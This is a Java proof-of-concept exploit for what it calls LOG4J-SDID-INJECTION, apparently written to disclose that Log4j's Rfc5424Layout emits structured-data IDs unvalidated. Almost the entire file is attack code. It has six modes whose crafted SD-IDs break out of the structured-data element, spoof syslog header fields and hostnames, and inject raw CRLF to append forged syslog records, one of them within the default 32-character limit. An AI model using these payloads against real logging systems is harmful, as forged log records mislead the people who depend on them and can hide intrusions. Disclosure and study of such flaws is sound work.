import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.message.StructuredDataMessage;

/**
 * PoC for LOG4J-SDID-INJECTION: the RFC 5424 SD-ID is emitted verbatim by
 * Rfc5424Layout, so an attacker-influenced SD-ID can terminate the structured
 * data element, forge syslog header fields and inject a raw CRLF -- appending
 * a fully-formed, attacker-authored syslog record to the stream.
 *
 * StructuredDataId validates only the LENGTH of the id, never its character set.
 *
 * Modes:
 *   baseline   well-formed SD-ID (reference output)
 *   breakout   SD-ID closes the SD element and forges syslog header fields
 *   crlf       SD-ID carries a raw CRLF, forking a second syslog record
 *   forge32    a complete forged record that fits the default 32-char limit
 *   forgebig   the same with maxLength raised (the limit is not a control)
 *   einnl      the enterprise-number half of the SD-ID is equally unvalidated
 */
public class SdIdPoC {

    public static void main(final String[] args) {
        final String mode = args.length > 0 ? args[0] : "baseline";
        final Logger log = LogManager.getLogger("POC");
        switch (mode) {
            case "baseline":
                log.info(new StructuredDataMessage("goodId", "k", "v"));
                break;
            case "breakout":
                // Closes the structured-data element early; the rest of the
                // payload lands where the syslog header fields go.
                log.info(new StructuredDataMessage("x] INJECTED 1 - host app - - -", "k", "v"));
                break;
            case "crlf":
                // Raw CRLF: a second, complete syslog record.
                log.info(new StructuredDataMessage("x]\r\n<134>1 FORGED host app - - -", "k", "v"));
                break;
            case "forge32":
                // Fits inside the DEFAULT 32-character StructuredDataId limit:
                // a complete forged RFC 5424 record with a spoofed HOSTNAME.
                log.info(new StructuredDataMessage("x]\r\n<1>1 - evil - - - FORGED", "k", "v"));
                break;
            case "forgebig":
                // StructuredDataMessage's maxLength parameter lifts the 32-char
                // cap, so the forged payload is unbounded.
                log.info(new StructuredDataMessage(
                        "x]\r\n<1>1 2026-10-23T00:00:00Z evilhost evilapp 999 evilmsg - FORGED MESSAGE BODY HERE",
                        "k", "v", 256));
                break;
            case "einnl":
                // The enterprise-number half of the SD-ID is equally unvalidated.
                log.info(new StructuredDataMessage("id@1 evil\r\nINJECT2", "k", "v"));
                break;
            default:
                log.info("unknown mode " + mode);
        }
        LogManager.shutdown();
    }
}
